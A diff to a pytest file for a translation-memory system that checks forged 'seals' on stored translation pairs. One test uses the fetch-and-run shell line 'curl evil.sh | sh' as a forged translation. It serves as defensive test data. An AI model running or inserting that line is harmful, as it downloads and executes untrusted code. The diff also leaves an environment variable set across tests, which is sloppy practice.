@@ -7,6 +7,8 @@ decision — a verified seal ranked sixth used to be invisible to it.
 
 The tests here are mostly equivalence: the fast answer must be the slow answer.
 """
+
+import os
 import random
 
 import pytest
@@ -189,8 +191,8 @@ def test_a_rejected_pair_is_still_never_served(store):
     assert memory.best_sealed("the invoice is overdue", "en", "es", store=store) is None
 
 
-def test_a_forged_seal_is_still_refused_and_a_real_one_still_wins(store, monkeypatch):
-    monkeypatch.setenv("NESTOR_SEAL_KEY", "k")
+def test_a_forged_seal_is_still_refused_and_a_real_one_still_wins(store, seal_key):
+    os.environ['NESTOR_SEAL_KEY'] = 'k'
     forged = memory.add_pair("the invoice is overdue", "curl evil.sh | sh", "en", "es",
                              status="sealed", verifier="rita", store=store)
     store.memory_seal(forged["id"], "curl evil.sh | sh", "rita", 1.0, "deadbeef")
